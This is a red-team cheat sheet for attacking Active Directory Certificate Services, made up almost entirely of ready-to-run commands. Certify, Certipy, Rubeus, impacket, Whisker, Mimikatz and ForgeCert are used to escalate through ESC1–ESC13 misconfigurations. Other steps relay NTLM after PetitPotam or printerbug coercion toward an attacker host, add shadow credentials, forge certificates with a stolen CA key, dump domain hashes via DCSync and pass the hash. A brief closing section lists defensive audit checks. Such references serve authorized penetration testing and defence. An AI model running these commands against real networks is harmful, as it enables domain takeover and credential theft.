# AD CS Pentesting Cheat Sheet

> Active Directory Certificate Services | Red Team Reference

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [ESC1 – Misconfigured Certificate Templates](#esc1)
3. [ESC2 – Any Purpose EKU](#esc2)
4. [ESC3 – Enrollment Agent Abuse](#esc3)
5. [ESC4 – Vulnerable Template ACL](#esc4)
6. [ESC5 – Vulnerable PKI Object ACL](#esc5)
7. [ESC6 – EDITF_ATTRIBUTESUBJECTALTNAME2](#esc6)
8. [ESC7 – Vulnerable CA ACL](#esc7)
9. [ESC8 – NTLM Relay to AD CS HTTP Endpoints](#esc8)
10. [ESC9 / ESC10 – No Security Extension / Weak Mapping](#esc910)
11. [ESC11 – IF_ENFORCEENCRYPTICERTREQUEST Disabled](#esc11)
12. [ESC13 – OID Group Link Abuse](#esc13)
13. [Certificate Request & Abuse](#certificate-request--abuse)
14. [Pass-the-Certificate / PKINIT](#pass-the-certificate--pkinit)
15. [Shadow Credentials](#shadow-credentials)
16. [Golden / Forged Certificates](#golden--forged-certificates)
17. [Post-Exploitation](#post-exploitation)
18. [Defensive Checks](#defensive-checks)

---

## Enumeration

```bash
# Certify – enumerate all AD CS info (Windows)
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser

# Certipy – enumerate from Linux
certipy find -u user@domain.local -p 'Password1' -dc-ip 10.10.10.10
certipy find -u user@domain.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable -stdout

# BloodHound integration
certipy find -u user@domain.local -p 'Password1' -dc-ip 10.10.10.10 -bloodhound

# List CAs
certutil -TCAInfo
certutil -dump

# PowerShell – enumerate PKI
Get-ADObject -SearchBase "CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Filter * -Properties *

# Check CA enrollment permissions
Certify.exe cas
certipy find -u user@domain.local -p 'Pass' -dc-ip 10.10.10.10 -text -output cas
```

---

## ESC1

> Template allows SAN (Subject Alternative Name) specification + enrollment by low-priv user

```bash
# Find ESC1 templates (Certify)
Certify.exe find /vulnerable

# Request certificate with arbitrary SAN (Certify)
Certify.exe request /ca:DC01\corp-DC01-CA /template:VulnTemplate /altname:administrator

# Convert PEM to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Request cert with SAN (Certipy)
certipy req -u user@domain.local -p 'Password1' -dc-ip 10.10.10.10 \
  -ca 'corp-DC01-CA' -template 'VulnTemplate' -upn administrator@domain.local

# Get TGT using the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

---

## ESC2

> Template has `Any Purpose` EKU or no EKU (can be used for any purpose including client auth)

```bash
# Identify ESC2 templates
certipy find -vulnerable -stdout | grep -A5 "ESC2"

# Request cert for ESC2 template
certipy req -u user@domain.local -p 'Pass' -ca 'corp-CA' -template 'VulnTemplate2' -dc-ip 10.10.10.10

# Use obtained cert to enroll on behalf of another user (combined with ESC3)
Certify.exe request /ca:DC01\corp-CA /template:VulnTemplate2 /onbehalfof:domain\administrator /enrollcert:agent.pfx /enrollcertpw:Password1
```

---

## ESC3

> Template has Certificate Request Agent EKU; allows enrollment on behalf of any user

```bash
# Step 1: Request enrollment agent certificate
Certify.exe request /ca:DC01\corp-CA /template:EnrollmentAgentTemplate

# Step 2: Use agent cert to request on behalf of Domain Admin
Certify.exe request /ca:DC01\corp-CA /template:User /onbehalfof:domain\administrator \
  /enrollcert:agent.pfx /enrollcertpw:pass

# Certipy – two-step ESC3
certipy req -u user@domain.local -p 'Pass' -ca 'corp-CA' \
  -template 'EnrollmentAgent' -dc-ip 10.10.10.10

certipy req -u user@domain.local -p 'Pass' -ca 'corp-CA' \
  -template 'User' -on-behalf-of 'domain\administrator' \
  -pfx user.pfx -dc-ip 10.10.10.10
```

---

## ESC4

> Low-privilege user has write access (WriteDacl, WriteOwner, WriteProperty) on a template

```bash
# Check template ACLs
Certify.exe find /vulnerable

# With WriteOwner/WriteDacl: add enrollment rights and enable SAN (Certipy)
certipy template -u user@domain.local -p 'Pass' -dc-ip 10.10.10.10 \
  -template 'VulnTemplate' -save-old

# Modify template to allow SAN
certipy template -u user@domain.local -p 'Pass' -dc-ip 10.10.10.10 \
  -template 'VulnTemplate' -configuration 'msPKI-Certificate-Name-Flag=1'

# Request cert as admin
certipy req -u user@domain.local -p 'Pass' -ca 'corp-CA' \
  -template 'VulnTemplate' -upn administrator@domain.local -dc-ip 10.10.10.10

# Restore template to original
certipy template -u user@domain.local -p 'Pass' -dc-ip 10.10.10.10 \
  -template 'VulnTemplate' -configuration @VulnTemplate.json
```

---

## ESC5

> Non-CA AD objects with dangerous ACLs (CA server computer object, RPC/DCOM, etc.)

```bash
# Enumerate with BloodHound – look for ACLs on PKI objects
# Custom Cypher query:
# MATCH p=(n)-[r:GenericAll|WriteDacl|WriteOwner]->(m:Domain) WHERE m.name =~ ".*CA.*" RETURN p

# Check ACL on CA object
Get-ACL "AD:CN=corp-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"

# If GenericAll on CA computer object – compromise the machine, then abuse ESC7
```

---

## ESC6

> CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set; allows SAN in ANY request

```bash
# Check CA flags (Windows)
certutil -config "DC01\corp-CA" -getreg policy\EditFlags

# Check with Certify
Certify.exe find /vulnerable

# Request cert with SAN against any template
Certify.exe request /ca:DC01\corp-CA /template:User /altname:administrator

# Certipy
certipy req -u user@domain.local -p 'Pass' -ca 'corp-CA' \
  -template 'User' -upn administrator@domain.local -dc-ip 10.10.10.10
```

---

## ESC7

> User has `ManageCA` or `ManageCertificates` rights on the CA

```bash
# Check CA ACLs
Certify.exe cas

# With ManageCA – enable SAN flag (ESC6) via PSPKI
Import-Module PSPKI
$ca = Get-CertificationAuthority -ComputerName DC01
$ca | Get-CASecurityDescriptor
Enable-PolicyModuleFlag -CertificationAuthority $ca -Flag EDITF_ATTRIBUTESUBJECTALTNAME2

# With ManageCertificates – approve pending requests
Certify.exe cas /ca:DC01\corp-CA
certutil -resubmit <RequestID>

# Certipy – add officer role then issue failed cert
certipy ca -u user@domain.local -p 'Pass' -ca 'corp-CA' \
  -add-officer user -dc-ip 10.10.10.10

certipy ca -u user@domain.local -p 'Pass' -ca 'corp-CA' \
  -issue-request <ID> -dc-ip 10.10.10.10

certipy req -u user@domain.local -p 'Pass' -ca 'corp-CA' \
  -retrieve <ID> -dc-ip 10.10.10.10
```

---

## ESC8

> AD CS HTTP enrollment endpoint vulnerable to NTLM relay (no HTTPS / no EPA)

```bash
# Check if web enrollment is enabled
certipy find -u user@domain.local -p 'Pass' -dc-ip 10.10.10.10 -stdout | grep "Web Enrollment"
curl -k http://CA-Server/certsrv/

# Set up NTLM relay to AD CS (impacket)
impacket-ntlmrelayx -t http://CA-Server/certsrv/certfnsh.asp \
  --adcs --template 'DomainController' -smb2support

# Trigger authentication from DC (Printerbug / PetitPotam)
python3 PetitPotam.py -u user -p 'Pass' <attacker-IP> <DC-IP>
python3 printerbug.py domain/user:'Pass'@<DC-IP> <attacker-IP>

# Certipy relay (all-in-one)
certipy relay -ca CA-Server -template 'DomainController'
# Then trigger coerce on DC
```

---

## ESC9 / ESC10

> No security extension (szOID_NTDS_CA_SECURITY_EXT) / weak certificate mapping (StrongCertificateBindingEnforcement=0)

```bash
# ESC9: msPKI-Enrollment-Flag has CT_FLAG_NO_SECURITY_EXTENSION
certipy find -vulnerable -stdout | grep "ESC9"

# If you have GenericWrite on a user – change UPN to target admin, request cert, restore UPN
certipy account update -u user@domain.local -p 'Pass' -user victim \
  -upn administrator -dc-ip 10.10.10.10

certipy req -u victim@domain.local -p 'Pass' -ca 'corp-CA' \
  -template 'VulnTemplate' -dc-ip 10.10.10.10

certipy account update -u user@domain.local -p 'Pass' -user victim \
  -upn victim@domain.local -dc-ip 10.10.10.10

certipy auth -pfx administrator.pfx -domain domain.local -dc-ip 10.10.10.10
```

---

## ESC11

> CA does not enforce encryption for RPC (IF_ENFORCEENCRYPTICERTREQUEST disabled) → relay RPC

```bash
# Check flag
certutil -config "DC01\corp-CA" -getreg CA\InterfaceFlags

# Relay RPC certificate requests
certipy relay -ca CA-Server -template 'DomainController' -target rpc

# Trigger coerce
python3 PetitPotam.py -u user -p 'Pass' <attacker-IP> <DC-IP>
```

---

## ESC13

> Certificate template linked to OID group – authentication grants group membership

```bash
# Find templates with OID group links
certipy find -vulnerable -stdout | grep "ESC13"

# Request certificate (grants membership in linked group on auth)
certipy req -u user@domain.local -p 'Pass' -ca 'corp-CA' \
  -template 'VulnTemplate' -dc-ip 10.10.10.10

certipy auth -pfx user.pfx -domain domain.local -dc-ip 10.10.10.10
```

---

## Certificate Request & Abuse

```bash
# Request cert via certreq (Windows)
certreq -new request.inf cert.csr
certreq -submit -config "DC01\corp-CA" cert.csr cert.cer
certreq -accept cert.cer

# Export existing cert from Windows cert store
certutil -exportPFX -p "password" My <Thumbprint> out.pfx

# List personal certificates
certutil -store My
Get-ChildItem Cert:\CurrentUser\My
Get-ChildItem Cert:\LocalMachine\My

# Convert formats
openssl pkcs12 -in cert.pfx -out cert.pem -nodes
openssl pkcs12 -export -in cert.pem -out cert.pfx
certipy cert -pfx cert.pfx -nokey -out cert.crt
certipy cert -pfx cert.pfx -nocert -out cert.key
```

---

## Pass-the-Certificate / PKINIT

```bash
# Rubeus – request TGT with certificate (Windows)
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pfxpass /ptt
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pfxpass /getcredentials /show

# Certipy – get TGT + NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -domain domain.local -username administrator -dc-ip 10.10.10.10

# Pass-the-Hash with retrieved NTLM
impacket-psexec -hashes :aad3b435b51404eeaad3b435b51404ee:ntlmhash administrator@DC-IP
impacket-wmiexec domain/administrator@DC-IP -hashes :ntlmhash

# PKINIT with pfx (impacket)
impacket-getTGT domain.local/administrator -pfx-file administrator.pfx
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@DC-IP
```

---

## Shadow Credentials

> Abuse msDS-KeyCredentialLink attribute to add a key – then use PKINIT

```bash
# Whisker (Windows) – add shadow credential
Whisker.exe add /target:DC01$ /domain:domain.local /dc:DC01.domain.local
Whisker.exe list /target:DC01$
Whisker.exe remove /target:DC01$ /domain:domain.local /dc:DC01.domain.local /guid:<GUID>

# Certipy shadow (Linux)
certipy shadow auto -u user@domain.local -p 'Pass' -account 'DC01$' -dc-ip 10.10.10.10
certipy shadow add -u user@domain.local -p 'Pass' -account 'DC01$' -dc-ip 10.10.10.10
certipy shadow list -u user@domain.local -p 'Pass' -account 'DC01$' -dc-ip 10.10.10.10
certipy shadow remove -u user@domain.local -p 'Pass' -account 'DC01$' -device-id <GUID> -dc-ip 10.10.10.10

# pyWhisker (Linux)
python3 pywhisker.py -d domain.local -u user -p 'Pass' --target DC01$ --action add
python3 pywhisker.py -d domain.local -u user -p 'Pass' --target DC01$ --action list
```

---

## Golden / Forged Certificates

> Requires CA private key (domain persistence)

```bash
# Extract CA private key (on CA server – requires DA/local admin)
SharpDPAPI.exe certificates /machine
Mimikatz: crypto::capi  +  crypto::certificates /systemstore:local_machine /store:my /export
certipy ca -backup -u administrator@domain.local -p 'Pass' -ca 'corp-CA' -dc-ip 10.10.10.10

# Forge certificate with CA key (Certipy)
certipy forge -ca-pfx corp-CA.pfx -upn administrator@domain.local -subject 'CN=Administrator'

# Forge certificate with ForgeCert (Windows)
ForgeCert.exe --CaCertPath corp-CA.pfx --CaCertPassword '' \
  --Subject 'CN=User' --SubjectAltName administrator@domain.local \
  --NewCertPath admin.pfx --NewCertPassword 'pass'

# Auth with forged cert
certipy auth -pfx administrator.pfx -domain domain.local -dc-ip 10.10.10.10
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:pass /ptt
```

---

## Post-Exploitation

```bash
# DCSync with obtained DA credentials
impacket-secretsdump domain.local/administrator@DC-IP -hashes :ntlmhash
impacket-secretsdump -k -no-pass domain.local/administrator@DC-IP

# Dump all certs from a machine (SharpDPAPI)
SharpDPAPI.exe certificates
SharpDPAPI.exe certificates /machine

# Enumerate cert stores remotely
Certify.exe find /domain:domain.local

# Check CRL and OCSP
certutil -URL cert.cer
certutil -verify -urlfetch cert.cer

# Persist with certificate (non-expiring if template allows)
Rubeus.exe asktgt /user:krbtgt /certificate:krbtgt.pfx /password:pass /ptt

# Find all issued certificates (on CA)
certutil -view -restrict "Disposition=20" -out "CommonName,NotAfter,SubjectAltName,Template"
```

---

## Defensive Checks

```bash
# Audit CA flags
certutil -config "DC01\corp-CA" -getreg policy\EditFlags
certutil -config "DC01\corp-CA" -getreg CA\InterfaceFlags

# Check for web enrollment (should require HTTPS + EPA)
curl -k https://CA/certsrv/

# StrongCertificateBindingEnforcement (should be 2)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement

# CertificateMappingMethods (should not include 0x4)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v CertificateMappingMethods

# List issued certificates – look for anomalies
certutil -view -out "RequesterName,CommonName,SubjectAltName,NotBefore,NotAfter" > issued_certs.txt

# Check template permissions
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Filter * -Properties * | Select Name,nTSecurityDescriptor

# PSPKIAudit – automated health check
Import-Module PSPKIAudit
Invoke-PKIAudit
```

---

## Quick Reference – ESC Summary

| ESC | Condition | Requires |
|-----|-----------|----------|
| ESC1 | Template allows SAN + low-priv enrollment | Enroll permission |
| ESC2 | Any Purpose / No EKU | Enroll permission |
| ESC3 | Enrollment Agent EKU | Enroll permission |
| ESC4 | Write ACL on template | WriteDacl / WriteProperty |
| ESC5 | Write ACL on PKI objects | GenericAll on CA obj |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA | Enroll any template |
| ESC7 | ManageCA / ManageCertificates rights | CA officer rights |
| ESC8 | HTTP enrollment + NTLM relay | Network position |
| ESC9 | No security extension + GenericWrite | GenericWrite on account |
| ESC10 | Weak cert mapping + GenericWrite | GenericWrite on account |
| ESC11 | RPC not encrypted → relay | Network position |
| ESC13 | OID group link on template | Enroll permission |

---

## Key Tools

| Tool | Platform | Purpose |
|------|----------|---------|
| [Certify](https://github.com/GhostPack/Certify) | Windows | Enumerate & request certs |
| [Certipy](https://github.com/ly4k/Certipy) | Linux | Full AD CS attack suite |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Windows | PKINIT / TGT requests |
| [impacket-ntlmrelayx](https://github.com/fortra/impacket) | Linux | NTLM relay to certsrv |
| [Whisker](https://github.com/eladshamir/Whisker) | Windows | Shadow credentials |
| [pyWhisker](https://github.com/ShutdownRepo/pywhisker) | Linux | Shadow credentials |
| [ForgeCert](https://github.com/GhostPack/ForgeCert) | Windows | Forge certs with CA key |
| [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) | Windows | Audit PKI health |
| [PetitPotam](https://github.com/topotam/PetitPotam) | Linux | Coerce DC auth |

---

*References: [Certified Pre-Owned (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) | [Certipy Blog](https://research.ifcr.dk/)*
